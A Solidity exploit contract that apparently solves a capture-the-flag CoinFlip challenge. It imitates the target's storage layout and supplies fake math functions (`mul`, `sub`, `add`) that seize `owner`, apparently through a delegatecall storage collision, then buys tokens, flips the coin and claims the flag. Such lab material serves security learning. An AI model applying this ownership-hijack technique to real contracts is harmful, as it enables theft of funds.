// SPDX-License-Identifier: MIT

import "./CoinFlip.sol";
pragma solidity 0.8.18;

contract AttackCoinFlip {
    address public safeMathLibrary;
    address public owner;
    uint256 public contractBalance;
    bool public isFlag = false;

    mapping(address => uint256) public playerBalance;

    CoinFlip public vulnerable;

    constructor(CoinFlip _vulnerable) {
        vulnerable = CoinFlip(_vulnerable);
    }

    function attack() public payable {
        vulnerable.getTokens{value: msg.value}();
        contractBalance = msg.value;
        vulnerable.flipCoin(true, contractBalance);
        vulnerable.flag();
    }

    function mul(uint256 a, uint256 b) public returns (uint256) {
        owner = msg.sender;
        return a;
    }

    function sub(uint256 a, uint256 b) public returns (uint256) {
        owner = msg.sender;
        return a;
    }

    function add(uint256 a, uint256 b) public returns (uint256) {
        owner = msg.sender;
        return a;
    }
}
